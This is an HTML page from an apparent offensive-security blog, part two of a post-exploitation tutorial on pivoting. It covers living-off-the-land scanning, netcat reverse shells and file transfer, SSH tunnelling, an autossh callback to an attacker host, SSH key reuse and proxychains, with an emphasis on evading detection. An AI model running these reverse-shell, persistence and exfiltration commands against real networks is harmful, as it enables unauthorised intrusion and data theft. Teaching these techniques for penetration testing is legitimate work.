<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Post-Exploitation: Shells are just the beginning (Part 2) - gotr00t Security Blog</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono:wght@400&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(45deg, #000000, #0a0a0a, #111111);
            color: #ffffff;
            font-family: 'Share Tech Mono', monospace;
            line-height: 1.8;
            min-height: 100vh;
        }

        /* Animated binary background */
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: radial-gradient(circle at 1px 1px, rgba(255, 255, 255, 0.15) 1px, transparent 0);
            background-size: 20px 20px;
            animation: binaryFlow 10s linear infinite;
            z-index: -1;
        }

        @keyframes binaryFlow {
            0% { transform: translateY(0); }
            100% { transform: translateY(20px); }
        }

        /* Navigation */
        .nav-header {
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(10px);
            border-bottom: 2px solid #ffffff;
            padding: 15px 0;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 2px 20px rgba(255, 255, 255, 0.3);
        }

        .nav-container {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 0 20px;
        }

        .nav-links {
            display: flex;
            gap: 30px;
            list-style: none;
        }

        .nav-link {
            color: #ffffff;
            text-decoration: none;
            padding: 12px 20px;
            border: 1px solid transparent;
            border-radius: 5px;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .nav-link:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: #ffffff;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
        }

        .nav-link.active {
            background: rgba(255, 255, 255, 0.2);
            border-color: #ffffff;
            color: #ffffff;
        }

        .nav-link i {
            color: #ffffff;
            width: 16px;
            text-align: center;
        }

        /* Main content */
        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 40px 20px;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(5px);
            min-height: 100vh;
        }

        .terminal-prompt {
            color: #00ff00;
            font-family: 'Share Tech Mono', monospace;
            font-size: 1.2em;
            margin-bottom: 20px;
            text-shadow: 0 0 10px #00ff00;
        }

        h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.8em;
            font-weight: 900;
            text-align: center;
            margin-bottom: 20px;
            color: #ffffff;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
            letter-spacing: 3px;
        }

        h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2em;
            font-weight: 700;
            margin: 30px 0 15px 0;
            color: #ffffff;
            text-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
            letter-spacing: 2px;
        }

        h3 {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.5em;
            font-weight: 400;
            margin: 25px 0 10px 0;
            color: #ffffff;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
            letter-spacing: 1px;
        }

        p {
            margin-bottom: 20px;
            color: #ffffff;
            font-size: 1.1em;
        }

        strong {
            color: #ffffff;
            font-weight: bold;
        }

        em {
            color: #cccccc;
            font-style: italic;
        }

        a {
            color: #00ff00;
            text-decoration: none;
            transition: all 0.3s ease;
        }

        a:hover {
            color: #ffffff;
            text-shadow: 0 0 10px #00ff00;
        }

        /* Code/command styling */
        code {
            background: rgba(255, 255, 255, 0.1);
            color: #00ff00;
            padding: 2px 8px;
            border-radius: 4px;
            font-family: 'Share Tech Mono', monospace;
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        /* Pre-formatted code blocks */
        pre {
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid #ffffff;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            overflow-x: auto;
            font-family: 'Share Tech Mono', monospace;
            line-height: 1.4;
        }

        pre code {
            background: none;
            border: none;
            padding: 0;
            color: #00ff00;
        }

        /* Highlighted text */
        mark {
            background: rgba(255, 255, 255, 0.2);
            color: #00ff00;
            padding: 2px 6px;
            border-radius: 3px;
        }

        /* Lists */
        ol, ul {
            margin: 20px 0;
            padding-left: 30px;
        }

        ol li, ul li {
            margin-bottom: 10px;
            color: #ffffff;
            font-size: 1.1em;
        }

        /* Image styling */
        figure {
            margin: 30px 0;
            text-align: center;
        }

        figure img {
            max-width: 100%;
            height: auto;
            border: 2px solid #ffffff;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
            transition: all 0.3s ease;
        }

        figure img:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(255, 255, 255, 0.5);
        }

        /* Conclusion section */
        .conclusion {
            border-top: 2px solid #ffffff;
            margin-top: 40px;
            padding-top: 30px;
        }

        /* Responsive design */
        @media (max-width: 768px) {
            .nav-links {
                gap: 15px;
                flex-wrap: wrap;
                justify-content: center;
            }

            .nav-link {
                padding: 10px 15px;
                font-size: 0.9em;
            }

            h1 {
                font-size: 2em;
            }

            h2 {
                font-size: 1.6em;
            }

            .container {
                padding: 20px 15px;
            }
        }
    </style>
</head>

<body>
    <!-- Navigation -->
    <nav class="nav-header">
        <div class="nav-container">
            <ul class="nav-links">
                <li><a href="../index.html" class="nav-link"><i class="fas fa-home"></i>Home</a></li>
                <li><a href="../poc.html" class="nav-link"><i class="fas fa-bug"></i>PoC</a></li>
                <li><a href="../projects.html" class="nav-link"><i class="fas fa-code"></i>Projects</a></li>
                <li><a href="../guides.html" class="nav-link"><i class="fas fa-book"></i>Guides</a></li>
                <li><a href="../blog.html" class="nav-link active"><i class="fas fa-pen-nib"></i>Blog</a></li>
                <li><a href="../contact.html" class="nav-link"><i class="fas fa-envelope"></i>Contact</a></li>
            </ul>
        </div>
    </nav>

    <div class="container">
        <div class="terminal-prompt">gotr00t@postexploit:~$</div>
        
        <h1>Post-Exploitation: Shells are just the beginning (Part 2)</h1>

        <h2>Pivoting</h2>

        <p><strong><em>Introduction</em></strong></p>

        <p>In Part 1, we covered privilege escalation and the various techniques used to obtain root. In Part 2, we shift focus to pivoting, a critical post exploitation technique that allows an attacker to move laterally within a network.</p>

        <p><strong><em>Understanding Pivoting</em></strong></p>

        <p>Pivoting enables access to internal hosts and services that are not directly exposed, often leading to systems containing more sensitive data. Each compromised system means we move further and deeper into the network.</p>

        <p><strong><em>Pivoting Techniques</em></strong></p>

        <p>In this section, I will cover several pivoting techniques that I regularly use to move laterally within a network. These are my go to methods in real world engagements. While there are more advanced pivoting techniques used by other hackers, this section focuses solely on approaches I have personally used and tested.</p>

        <ol>
            <li>Living Of The Land</li>
            <li>SSH Tunneling</li>
            <li>SSH Key Reuse</li>
            <li>SOCKS / Proxying</li>
        </ol>

        <p><strong><em>Living Of The Land</em></strong></p>

        <p>LOTL (Living Off the Land) is when hackers rely on tools that are already installed on the system. Since these binaries are legitimate and used every day, their activity often looks normal to intrusion detection systems and firewalls, making it easier to stay under the radar.</p>

        <p><strong><em>Living of The Land Techniques</em></strong></p>

        <p>Here are a few techniques you can use to live off the land while staying under the radar.</p>

        <p><mark>Scripting Languages</mark></p>

        <p>Using built-in scripting languages like Bash to run shell commands, for example, performing ping sweeps to identify other hosts on the network.</p>

        <pre><code>for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done</code></pre>

        <p>Or running basic port scans to discover services that can be exploited:</p>

        <pre><code>for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done</code></pre>

        <p>Using the network and services discovered through these techniques, we can target vulnerable services and pivot further into other internal networks accessible from the compromised system.</p>

        <p><mark>LOLBins</mark></p>

        <p>LOLBins (Living Off the Land Binaries) this are practically legitimate executables that come preinstalled on linux / unix systems that can be used during the post exploitation phase. Why are these binaries useful? These binaries are mostly trusted and signed and are used by admins and system processes. As you can see these binaries might fly under the radar when used.</p>

        <p>A good example is Netcat (nc). This networking utility is frequently used because it is often preinstalled or easy to upload and its traffic can blend in with normal system activity. Netcat is commonly used for reverse shells, basic listeners, and file transfers.</p>

        <p><strong>Reverse shell examples</strong></p>

        <p><code>nc -e /bin/sh &lt;ip&gt; &lt;port&gt;</code> or a named pipe if -e is unavailable.</p>

        <p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc &lt;ip&gt; &lt;port&gt; >/tmp/f</code></p>

        <p>These reverse shell techniques allow us to access the networks we've compromised and pivoted into, giving us a way to maintain persistence and retain access to internal systems over time.</p>

        <p><strong>File Transfer examples</strong></p>

        <p>We can start by setting up a listener on the compromised machine, which allows us to transfer files out of the system, such as malicious binaries or collected data.</p>

        <p>Victim: <code>nc -l -p 1234 &gt; file</code></p>

        <p>At this point, we are ready to transfer the malicious file.</p>

        <p>Attacker: <code>nc &lt;ip&gt; 1234 &lt; file</code></p>

        <p><strong><em>SSH Tunneling</em></strong></p>

        <p>Let's start this section by breaking down SSH and how we can abuse SSH tunneling to pivot deeper into internal networks.</p>

        <p>So what's SSH? SSH (Secure Shell) is a protocol that establishes encrypted connections between computers. It basically allows you to connect to a remote server securely. By using SSH tunneling, we can forward network traffic from one system to another, this lets us move laterally, stay encrypted, and blend in with normal SSH traffic while accessing internal services as if we were sitting inside the network.</p>

        <p><mark>Local Port Forwarding</mark></p>

        <p>In a nutshell, local port forwarding exposes a remote service on a local port. How does this actually works? The traffic from a local port is forwarded through the ssh tunnel to a specified destination host and port. This allows us to access an internal service that is only reachable from the ssh server.</p>

        <p>Example: <code>ssh -L 8080:127.0.0.1:80 user@ssh_server</code></p>

        <p>Let's break this command down:</p>

        <ul>
            <li>8080 is the local listening port</li>
            <li>127.0.0.1:80 is the destination as seen by the SSH server</li>
            <li>Any connection to localhost:8080 is forwarded to the remote service on port 80</li>
        </ul>

        <p><mark>Remote Port Forwarding</mark></p>

        <p>We explained local port forwarding above, let's explain remote port forwarding which is practically the opposite. Remote port forwarding is an ssh feature that allows services running on a local machine to be exposed through a remote ssh server.</p>

        <p>But how does this work? You need to establish an SSH connection with remote port forwarding enabled, you basically instruct the SSH server to listen on a specific port, any connection made to that port on the remote server is securely tunneled back through the SSH connection and delivered to a port on your local machine.</p>

        <p>Command: <code>ssh -R &lt;remoteport&gt;:&lt;localhost&gt;:&lt;localport&gt; user@remoteserver</code></p>

        <p>Here's a better example which the actual command to use: <code>ssh -R 9000:localhost:8080 user@10.10.10.5</code></p>

        <p>Let's break this down a bit. Port 9000 is opened on the remote server. Any connection to 10.10.10.5:9000 is forwarded to localhost:8080 on your machine, the service running locally on port 8080 becomes accessible through the remote host.</p>

        <p>But how is remote port forwarding useful for Pivoting? It exposes internal services to an external machine which is your attackers machine. It also creates a reliable callback channel which maintains access to services that are unreachable. This makes it a good pivoting technique when moving through networks.</p>

        <p>Remote port forwarding is quiet compared to traditional pivoting methods, traffic is encrypted and blends in with normal SSH usage. It can also bypass network segmentation and maintain access without noisy scanning, this will allow you to pivot deeper into the network.</p>

        <p>It's also worth mentioning that SSH can be used for persistence with autossh. Standard SSH tunnels will drop if the connection dies, which immediately cuts off access. Attackers often use autossh because it automatically monitors and re-establishes the tunnel if it goes down, providing reliable persistence even in tightly restricted network environments.</p>

        <p>Auto SSH: <code>autossh -N -R 4444:127.0.0.1:22 attacker@ATTACKERIP</code></p>

        <p><mark>SSH Key Reuse</mark></p>

        <p>This section provides a brief overview of SSH key reuse. While the concept is simple, it is a powerful technique that can be leveraged to gain access to additional systems or pivot into other networks.</p>

        <p>How does it work? you may discover private SSH keys on a compromised system. These keys can then be tested against other hosts on the network that expose port 22 or are running an SSH service. In many environments, the same keys are reused across multiple systems which makes pivoting very easy.</p>

        <p>Where to find private SSH keys? SSH keys are typically located in the <code>~/.ssh/</code> directory and may include files such as id_rsa, id_ed25519, or associated configuration files. After identifying SSH keys that are reused across multiple systems, you can authenticate to another network using the same key with the following command:</p>

        <p><code>ssh -i &lt;private_key&gt; user@target_host</code></p>

        <p>Lets break this command down:</p>

        <p>-i &lt;private_key&gt; Specifies the private SSH key file to use for authentication instead of a password. If the corresponding public key is trusted on another host, access is granted immediately</p>

        <p><strong><em>SSHark</em></strong></p>

        <p>I built this tool while learning and teaching myself the SSH key reuse technique. To really understand how it works in practice, I decided to apply the concept by writing a tool that automates the process.</p>

        <p>Below is a brief overview of how the tool works:</p>

        <p>SSHark automates the process of discovering SSH private keys on a compromised system and testing them against other hosts in the network. It exploits a common security weakness: SSH key reuse across multiple systems.</p>

        <p>Github: <a href="https://github.com/gotr00t0day/SSHark">https://github.com/gotr00t0day/SSHark</a></p>

        <p><mark>SOCKS / Proxying</mark></p>

        <p>Here we'll go a bit deeper into pivoting by introducing a more advanced technique called SOCKS proxying. To understand why this matters, let's first break down what SOCKS actually is.</p>

        <p>SOCKS (Socket Secure) is a network protocol that forwards traffic between a client and a destination through a proxy server. Unlike HTTP proxies which only handle web traffic, SOCKS5 operates at a lower level (Layer 5, the session layer). Because of that, it isn't limited to HTTP. It can proxy any TCP or UDP traffic, including SSH, FTP, HTTP, database connections, and pretty much any other protocol.</p>

        <p>So why is SOCKS proxying so powerful for pivoting?</p>

        <p>Think about the situation: the compromised host can already reach internal systems on the network, but you can't reach them directly. By running a SOCKS5 proxy through your existing session, you essentially borrow the network visibility of that compromised host. This allows you to aim your entire toolkit at internal systems as if you were inside the network yourself. This is where proxychains comes into play.</p>

        <p>So What the F is Proxychains?</p>

        <p>Proxychains is a tool that intercepts network calls made by other applications and transparently routes them through your SOCKS proxy. In practice, this means tools that were never designed to use a proxy can suddenly operate through your pivot, giving you seamless access to internal services and hosts.</p>

        <p>This is an example how your config file should look like:</p>

        <p><code>socks5 127.0.0.1 1080</code></p>

        <p>Now you can use proxy chains to scan for example the internal network:</p>

        <p><code>proxychains nmap -sT -Pn 10.10.10.0/24</code></p>

        <p>Or ssh to the compromised host or any internal network:</p>

        <p><code>proxychains ssh admin@10.10.10.100</code></p>

        <figure><img src="../Images/shellhandler.png" alt="Shell handler with SOCKS tunneling support"/></figure>

        <p><strong>Shell handler with built-in SOCKS tunneling support for routing active sessions</strong> (This is a private tool made in C++)</p>

        <figure><img src="../Images/socksproxychains.png" alt="Proxychains accessing internal web server"/></figure>

        <p>As you can see in the image above, we were able to use proxychains to access a web server on the local network.</p>

        <p>SOCKS5 proxying transforms a single compromised host into a gateway to entire networks. It's an essential technique for any penetration tester moving beyond the initial foothold into lateral movement and privilege escalation phases.</p>

        <div class="conclusion">
            <h2>Conclusion</h2>

            <p>Getting a shell is just the start. The real work begins when you figure out how to move through the network and reach systems that were never meant to be exposed in the first place. At the end of the day, pivoting isn't about memorizing commands. It's about understanding how traffic flows, what the network trusts, and how to abuse that trust without drawing attention.</p>

            <p>Once you get that mindset, you stop thinking in terms of hosts and start thinking in terms of paths. And that's when you're no longer just on a box you're moving freely inside the network.</p>

            <h1>HACKING FROM THE SHADOWS!</h1>
        </div>

    </div>

</body>
</html>
